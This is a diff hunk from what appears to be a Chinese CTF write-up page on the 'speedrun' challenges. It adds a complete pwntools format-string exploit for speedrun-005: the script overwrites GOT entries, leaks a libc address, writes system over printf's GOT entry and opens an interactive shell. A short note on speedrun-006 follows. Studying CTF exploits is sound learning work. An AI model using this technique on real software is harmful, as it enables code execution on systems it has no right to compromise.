@@ -150,6 +150,66 @@ icon: icon-html
 
   
 
+* speedrun-005
+
+  ```python
+  from pwn import *
+  r = process(['./speedrun-005'],env = {"LD_PRELOAD":"./libc-2.27.so"})
+  context.terminal = ['deepin-terminal', '-x', 'sh' ,'-c']
+  elf = ELF('./speedrun-005')
+  libc = ELF('./libc-2.27.so')
+  puts_got = elf.got['puts']
+  read_got = elf.got['read']
+  printf_got = elf.got['printf']
+  read_libc = libc.symbols['read']
+  system_libc = libc.symbols['system']
+  main_addr= 0x040069d
+  offset = 6
+  #aaaa%6$x
+  r.recvuntil('time? ')
+  payload = 'aa%4195995c%8$ln'+ p64(puts_got)
+  r.send(payload)
+  payload = 'fuck%7$s'+p64(read_got)
+  r.send(payload)
+  r.recvuntil('uck')
+  a = r.recv(6).ljust(8,'\x00')
+  read_leak = u64(a)
+  print(hex(read_leak))
+  
+  libc_base = read_leak- read_libc
+  system = libc_base + system_libc
+  fuck = system
+  fuck_bytes= hex(fuck)[2:]
+  print(fuck_bytes)
+  a = int(fuck_bytes[10:],16)
+  b = int(fuck_bytes[8:10],16)+0xf00-a
+  c = int(fuck_bytes[6:8],16)+2*0xf00-a-b
+  d = int(fuck_bytes[4:6],16)+4*0xf00-a-b-c
+  e = int(fuck_bytes[2:4],16)+8*0xf00-a-b-c-d
+  f = int(fuck_bytes[:2],16)+16*0xf00-a-b-c-d-e
+  
+  payload = ''
+  payload += '%'+str(a)+'c%16$hhn'
+  payload += '%'+str(b)+'c%17$hhn'
+  payload += '%'+str(c)+'c%18$hhn'
+  payload += '%'+str(d)+'c%19$hhn'
+  payload += '%'+str(e)+'c%20$hhn'
+  payload += '%'+str(f)+'c%21$hhn'
+  payload = payload.ljust(80,'a')
+  payload += p64(printf_got)
+  payload += p64(printf_got+1)
+  payload += p64(printf_got+2)
+  payload += p64(printf_got+3)
+  payload += p64(printf_got+4)
+  payload += p64(printf_got+5)
+  
+  r.send(payload)
+  
+  r.interactive()
+  ```
+
+  
+
 * speedrun-006
 
   输入的shellcode被改变，前面加上xor语句清空除rip外所有寄存器。在5,10,20,29除插入0xcc(int3)
